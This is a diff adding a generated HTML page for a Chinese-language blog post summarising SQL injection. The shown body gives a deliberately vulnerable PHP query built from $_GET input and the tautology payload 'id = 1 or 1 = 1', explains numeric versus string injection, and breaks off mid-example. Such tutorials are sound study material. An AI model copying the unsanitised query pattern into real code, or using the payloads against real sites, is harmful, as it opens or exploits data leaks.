@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>SQL注入总结 | swedsn</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="SQL注入总结 | swedsn">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="无过滤注入：Web171：无任何条件1、题目查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;  2、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow刷题记录-sql注入">
+<meta property="og:url" content="http://example.com/2022/07/20/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="swedsn">
+<meta property="og:description" content="无过滤注入：Web171：无任何条件1、题目查询语句 &#x2F;&#x2F;拼接sql语句查找指定ID用户 $sql &#x3D; &quot;select id,username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;  2、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713193828812.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714094708518.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714100039465.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714100809368.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220714102501924.png">
+<meta property="og:image" content="http://example.com/img/image-20220714140322101.png">
+<meta property="og:image" content="http://example.com/img/image-20220714140556079.png">
+<meta property="og:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220716144032670.png">
+<meta property="article:published_time" content="2022-07-20T11:05:57.000Z">
+<meta property="article:modified_time" content="2022-07-20T11:08:13.411Z">
+<meta property="article:author" content="swedsn">
+<meta property="article:tag" content="web安全、sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713193828812.png">
+
+
+<link rel="icon" href="/img/logo.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/kimbie-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>swedsn</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/swedsn?tab=repositories"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="csdn"
+               href="https://blog.csdn.net/qq_51032807?spm=1000.2115.3001.5343"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-csdn"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:jaytp@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=1627319559&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="全部文章">全部文章
+            
+                <small>(23)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="开发">
+                        <i class="fold iconfont icon-right"></i>
+                        
+                        开发
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                        <ul class="sub hide">
+                            
+                                <li>
+                                    <div data-rel="开发<--->支付宝接口">
+                                        
+                                        支付宝接口
+                                        
+                                            <small>(1
+                                                )</small>
+                                        
+                                    </div>
+                                    
+                                </li>
+                            
+                                <li>
+                                    <div data-rel="开发<--->Java开发">
+                                        <i class="fold iconfont icon-right"></i>
+                                        
+                                        Java开发
+                                        
+                                            <small>(1
+                                                )</small>
+                                        
+                                    </div>
+                                    
+                                        <ul class="sub hide">
+                                            
+                                                <li>
+                                                    <div data-rel="开发<--->Java开发基础知识">
+                                                        
+                                                        基础知识
+                                                        
+                                                            <small>(1)</small>
+                                                        
+                                                    </div>
+                                                </li>
+                                            
+                                        </ul>
+                                    
+                                </li>
+                            
+                        </ul>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="工具箱">
+                        <i class="fold iconfont icon-right"></i>
+                        
+                        工具箱
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                        <ul class="sub hide">
+                            
+                                <li>
+                                    <div data-rel="工具箱<--->Misc">
+                                        
+                                        Misc
+                                        
+                                            <small>(2
+                                                )</small>
+                                        
+                                    </div>
+                                    
+                                </li>
+                            
+                        </ul>
+                    
+                </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Pwn入门">
+                        <i class="fold iconfont icon-right"></i>
+                        
+                        Pwn入门
+                        <small>(15)</small>
+                        
+                    </div>
+                    
+                        <ul class="sub hide">
+                            
+                                <li>
+                                    <div data-rel="Pwn入门<--->格式化字符串漏洞">
+                                        
+                                        格式化字符串漏洞
+                                        
+                                            <small>(2
+                                                )</small>
+                                        
+                                    </div>
+                                    
+                                </li>
+                            
+                                <li>
+                                    <div data-rel="Pwn入门<--->基础知识">
+                                        
+                                        基础知识
+                                        
+                                            <small>(5
+                                                )</small>
+                                        
+                                    </div>
+                                    
+                                </li>
+                            
+                                <li>
+                                    <div data-rel="Pwn入门<--->栈溢出">
+                                        
+                                        栈溢出
+                                        
+                                            <small>(8
+                                                )</small>
+                                        
+                                    </div>
+                                    
+                                </li>
+                            
+                        </ul>
+                    
+                </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Web安全">
+                        <i class="fold iconfont icon-right"></i>
+                        
+                        Web安全
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                        <ul class="sub hide">
+                            
+                                <li>
+                                    <div data-rel="Web安全<--->SQL注入">
+                                        
+                                        SQL注入
+                                        
+                                            <small>(2
+                                                )</small>
+                                        
+                                    </div>
+                                    
+                                </li>
+                            
+                        </ul>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">关于</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">友链</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="23">
+<input type="hidden" id="yelog_site_word_count" value="36.3k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">全部文章</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>web安全、sql注入</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="全部文章 Web安全 SQL注入 "
+           href="/2022/07/20/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-sql%E6%B3%A8%E5%85%A5/"
+           data-tag="web安全、sql注入"
+           data-author="" >
+            <span class="post-title" title="ctfshow刷题记录-sql注入">ctfshow刷题记录-sql注入</span>
+            <span class="post-date" title="2022-07-20 19:05:57">2022/07/20</span>
+        </a>
+        
+        
+        <a  class="全部文章 Web安全 SQL注入 "
+           href="/2022/07/20/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SQL注入总结">SQL注入总结</span>
+            <span class="post-date" title="2022-07-20 19:05:32">2022/07/20</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2022/07/20/%E6%9D%82%E8%AE%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="杂记">杂记</span>
+            <span class="post-date" title="2022-07-20 19:04:35">2022/07/20</span>
+        </a>
+        
+        
+        <a  class="全部文章 工具箱 Misc "
+           href="/2022/07/20/%E6%98%93%E6%A0%A1%E5%9B%AD%E8%87%AA%E5%8A%A8%E6%89%93%E5%8D%A1/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="易校园自动打卡">易校园自动打卡</span>
+            <span class="post-date" title="2022-07-20 18:49:05">2022/07/20</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 格式化字符串漏洞 "
+           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="格式化字符串漏洞--刷题记录">格式化字符串漏洞--刷题记录</span>
+            <span class="post-date" title="2022-07-12 13:51:47">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 格式化字符串漏洞 "
+           href="/2022/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="格式化字符串漏洞--基本原理">格式化字符串漏洞--基本原理</span>
+            <span class="post-date" title="2022-07-12 13:51:39">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E6%A0%88%E8%BF%81%E7%A7%BB/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="花式栈溢出--栈迁移">花式栈溢出--栈迁移</span>
+            <span class="post-date" title="2022-07-12 13:45:03">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96flag/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="花式栈溢出-一键获取flag">花式栈溢出-一键获取flag</span>
+            <span class="post-date" title="2022-07-12 13:44:56">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-mprotect%E7%BB%95%E8%BF%87NX%E4%BF%9D%E6%8A%A4/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="花式栈溢出-mprotect绕过NX保护">花式栈溢出-mprotect绕过NX保护</span>
+            <span class="post-date" title="2022-07-12 13:44:49">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA-DynELF/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="花式栈溢出-DynELF">花式栈溢出-DynELF</span>
+            <span class="post-date" title="2022-07-12 13:44:40">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 "
+           href="/2022/07/12/%E4%B8%AD%E7%BA%A7ROP%EF%BC%882-1%EF%BC%89-ret2csu/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="中级ROP（2-1）-ret2csu">中级ROP（2-1）-ret2csu</span>
+            <span class="post-date" title="2022-07-12 13:44:28">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-4%EF%BC%89-ret2libc/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基本ROP（1-4）--ret2libc">基本ROP（1-4）--ret2libc</span>
+            <span class="post-date" title="2022-07-12 13:44:21">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-3%EF%BC%89-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基本ROP（1-3）-系统调用">基本ROP（1-3）-系统调用</span>
+            <span class="post-date" title="2022-07-12 13:44:05">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-2%EF%BC%89-ret2shellcode/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基本ROP（1-2）-ret2shellcode">基本ROP（1-2）-ret2shellcode</span>
+            <span class="post-date" title="2022-07-12 13:43:56">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 栈溢出 "
+           href="/2022/07/12/%E5%9F%BA%E6%9C%ACROP%EF%BC%881-1%EF%BC%89-ret2text/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基本ROP（1-1）-ret2text">基本ROP（1-1）-ret2text</span>
+            <span class="post-date" title="2022-07-12 13:43:47">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 基础知识 "
+           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-5%EF%BC%89-Linux%E4%B8%8BELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基础知识（1-5）-Linux下ELF文件的保护机制">基础知识（1-5）-Linux下ELF文件的保护机制</span>
+            <span class="post-date" title="2022-07-12 13:40:54">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 基础知识 "
+           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-4%EF%BC%89-%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基础知识（1-4）-分析工具">基础知识（1-4）-分析工具</span>
+            <span class="post-date" title="2022-07-12 13:40:36">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 基础知识 "
+           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-3%EF%BC%89-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基础知识（1-3）-二进制基础">基础知识（1-3）-二进制基础</span>
+            <span class="post-date" title="2022-07-12 13:40:27">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 基础知识 "
+           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-2%EF%BC%89-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基础知识（1-2）-环境配置">基础知识（1-2）-环境配置</span>
+            <span class="post-date" title="2022-07-12 13:40:08">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 Pwn入门 基础知识 "
+           href="/2022/07/12/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%881-1%EF%BC%89-Linux%E5%9F%BA%E7%A1%80/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="基础知识（1-1）-Linux基础">基础知识（1-1）-Linux基础</span>
+            <span class="post-date" title="2022-07-12 13:39:59">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 开发 支付宝接口 "
+           href="/2022/07/12/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="支付宝接口开发">支付宝接口开发</span>
+            <span class="post-date" title="2022-07-12 09:55:16">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 工具箱 Misc "
+           href="/2022/07/12/Latex%E7%9A%84%E5%AD%A6%E4%B9%A0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Latex的学习">Latex的学习</span>
+            <span class="post-date" title="2022-07-12 09:54:45">2022/07/12</span>
+        </a>
+        
+        
+        <a  class="全部文章 开发 Java开发 基础知识 "
+           href="/2022/07/12/Java%E5%AD%A6%E4%B9%A001-%E5%89%8D%E6%8F%90%E5%87%86%E5%A4%87/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Java学习01-前提准备">Java学习01-前提准备</span>
+            <span class="post-date" title="2022-07-12 09:54:29">2022/07/12</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-SQL注入总结" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">SQL注入总结</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Web安全">Web安全</a> > 
+            
+            <a  data-rel="Web安全&lt;---&gt;SQL注入">SQL注入</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2022-07-20 19:07:28'>2022-07-20 19:05</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:4.1k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-text">SQL注入总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-text">一、sql注入的基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">二、SQL注入常见的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">1、数字型注入与字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%B8%8E%E7%9B%B2%E6%B3%A8"><span class="toc-text">2、报错注入与盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">三、SQL基本知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-text">1、注释符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">2、union联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2"><span class="toc-text">3、连接查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81group-by-%E4%B8%8E-having"><span class="toc-text">4、group by 与 having</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E8%BF%90%E7%AE%97%E7%AC%A6%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-text">5、运算符的优先级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">6、常见的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81information-schema%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">7、information_schema数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E4%BB%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">四、常见的过滤以及绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="toc-text">1、万能钥匙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%AF%B9%E4%BA%8E%E8%BF%94%E5%9B%9E%E9%9B%86%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-text">2、对于返回集的判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E8%BF%87%E6%BB%A4%E6%8E%89%E4%BA%86%E7%A9%BA%E6%A0%BC"><span class="toc-text">3、过滤掉了空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E8%BF%87%E6%BB%A4%E6%8E%89%E4%BA%86%E6%B3%A8%E9%87%8A"><span class="toc-text">4、过滤掉了注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E8%BF%87%E6%BB%A4%E6%8E%89%E4%BA%86%E5%BC%95%E5%8F%B7"><span class="toc-text">5、过滤掉了引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E8%BF%87%E6%BB%A4%E6%8E%89%E4%BA%86select%E3%80%81where%E7%AD%89"><span class="toc-text">6、过滤掉了select、where等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81%E8%BF%87%E6%BB%A4%E6%8E%89%E4%BA%86%E6%95%B0%E5%AD%97"><span class="toc-text">7、过滤掉了数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E3%80%81%E7%9B%B2%E6%B3%A8"><span class="toc-text">8、盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E3%80%81md5%E3%80%81%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-text">9、md5、弱类型比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">五、sqlmap的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%9C%89%E5%85%B3%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">1、有关链接：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9"><span class="toc-text">2、查询内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E7%94%A8%E6%88%B7%E7%9A%84%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-text">3、用户的权限问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%85%E8%A7%A3%E5%86%B3"><span class="toc-text">待解决</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h2 id="一、sql注入的基本原理"><a href="#一、sql注入的基本原理" class="headerlink" title="一、sql注入的基本原理"></a>一、sql注入的基本原理</h2><p>PHP从MySQL数据库中读取数据的方式</p>
+<pre><code class="php">$id = $_GET[&quot;id&quot;];
+$sql = &quot;select * from user where id = $id&quot;;
+$result = mysqli_query($sql);
+$row = mysql_fetch_array($result);
+</code></pre>
+<ul>
+<li>首先是通过get请求从前端的表单中收集到你输入的值</li>
+<li>然后调用mysqli_query函数向当前活动数据库发送一条MySQL查询语句，将结果集取出并赋给变量$result</li>
+<li>最后，mysql_fetch_arry从结果集中取得一行作为关联数组</li>
+</ul>
+<p>从上面的sql语句的查询方式可以发现一个问题，那就是如果我们输入的id被我恶意构造就可能会造成其余数据的泄露，例如如果输入id为：</p>
+<pre><code class="sql">id = 1 or 1 = 1
+</code></pre>
+<p>那么此时的sql查询语句就会变成</p>
+<pre><code class="sql">select * from user where id = 1 or 1 = 1
+</code></pre>
+<p>这里存在or，且后面的值为1，那么无论前面的id的值为多少他都会把user表里面的所有的东西打印出来，如果user表中存在管理员的账号密码那么我们就可以直接获得管理员的权限。</p>
+<p>造成的原因：</p>
+<blockquote>
+<p>整个过程实现的原因主要就是网站对于我们输入的sql语句的内容没有进行过滤导致的，这样网站的服务器就会执行我们输入的所有内容，只要语句本身没有语法问题就会执行，导致执行本不该执行的内容</p>
+</blockquote>
+<h2 id="二、SQL注入常见的分类"><a href="#二、SQL注入常见的分类" class="headerlink" title="二、SQL注入常见的分类"></a>二、SQL注入常见的分类</h2><h3 id="1、数字型注入与字符型注入"><a href="#1、数字型注入与字符型注入" class="headerlink" title="1、数字型注入与字符型注入"></a>1、数字型注入与字符型注入</h3><p>产生这种分类主要的原因是sql查询语句的不同，可分为数字型注入与字符型注入。</p>
+<ul>
+<li>数字型注入：注入点的数据内容是数字型，就是说对于输入的内容没有用单引号引起来</li>
+</ul>
+<pre><code class="sql">select * from user where id = $_GET[&#39;id&#39;]
+id=1;
+select * from user where id = 1;
+</code></pre>
+<ul>
+<li>字符型注入：注入点的数据内容是字符型，对于输入的内容用单引号引起来</li>
+</ul>
+<pre><code class="sql">select * from user where id = &#39;$_GET[&#39;id&#39;]&#39;;
+id=1;
